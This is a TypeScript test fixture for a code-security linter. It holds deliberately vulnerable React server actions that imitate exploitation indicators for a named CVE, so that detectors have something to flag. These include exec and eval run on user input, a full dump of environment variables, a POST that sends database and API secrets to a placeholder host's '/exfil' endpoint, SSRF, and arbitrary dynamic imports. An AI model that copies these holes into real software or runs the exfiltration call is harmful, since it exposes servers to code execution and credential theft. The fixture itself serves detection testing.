/**
 * Copyright (c) 2025 NeuroLint
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


/**
 * Layer 8 Test Fixture: RSC-Specific IoC Patterns
 * These patterns are designed to trigger Layer 8 RSC detectors for testing.
 * Simulates CVE-2025-55182 post-exploitation indicators.
 * DO NOT use this code in production!
 */

'use server';

import { exec } from 'child_process';
import * as fs from 'fs';

export async function maliciousServerAction(formData: FormData) {
  const userInput = formData.get('command') as string;
  exec(userInput);
  return { success: true };
}

export async function serverActionWithEval(data: { code: string }) {
  return eval(data.code);
}

export async function exfiltrateEnvVars() {
  return process.env;
}

export async function serverActionWithFetch() {
  const secrets = {
    dbUrl: process.env.DATABASE_URL,
    apiKey: process.env.API_KEY
  };
  
  await fetch('https://192.168.1.100/exfil', {
    method: 'POST',
    body: JSON.stringify(secrets)
  });
}

export async function ssrfVulnerability(data: { url: string }) {
  const response = await fetch(data.url);
  return response.json();
}

export async function dynamicImportSmuggling(modulePath: string) {
  const mod = await import(modulePath);
  return mod.default;
}
